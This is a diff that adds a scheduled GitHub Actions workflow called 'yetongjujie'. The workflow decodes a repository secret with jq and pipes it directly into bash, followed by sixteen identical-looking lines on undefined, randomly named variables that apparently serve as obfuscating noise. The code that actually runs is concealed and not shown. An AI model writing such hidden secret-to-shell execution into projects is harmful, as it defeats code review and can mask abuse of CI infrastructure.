@@ -1,0 +1,33 @@
+name: yetongjujie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yetongjujie
+        env:
+          ge4: ${{ secrets.ge4 }}
+        run: |
+          echo $ge4 | jq -r .w05957 | /bin/bash
+          echo $q42224 | jq -r .v950 | /bin/bash
+          echo $v4 | jq -r .c925 | /bin/bash
+          echo $rpn74 | jq -r .ipuej9858 | /bin/bash
+          echo $oe73014 | jq -r .hb7862 | /bin/bash
+          echo $lgvt11491 | jq -r .d22 | /bin/bash
+          echo $ik0 | jq -r .oj071 | /bin/bash
+          echo $ysct0 | jq -r .url5 | /bin/bash
+          echo $xab90 | jq -r .pcgbw64746 | /bin/bash
+          echo $txv257 | jq -r .vqz78474 | /bin/bash
+          echo $uwhs51 | jq -r .dpdg0458 | /bin/bash
+          echo $fo1 | jq -r .kdh9166 | /bin/bash
+          echo $gmmks5103 | jq -r .mix194 | /bin/bash
+          echo $m0663 | jq -r .bkj58881 | /bin/bash
+          echo $o7462 | jq -r .ukry1345 | /bin/bash
+          echo $ici73371 | jq -r .rpq8469 | /bin/bash
+          echo $mwnnw2 | jq -r .pfe038 | /bin/bash
+
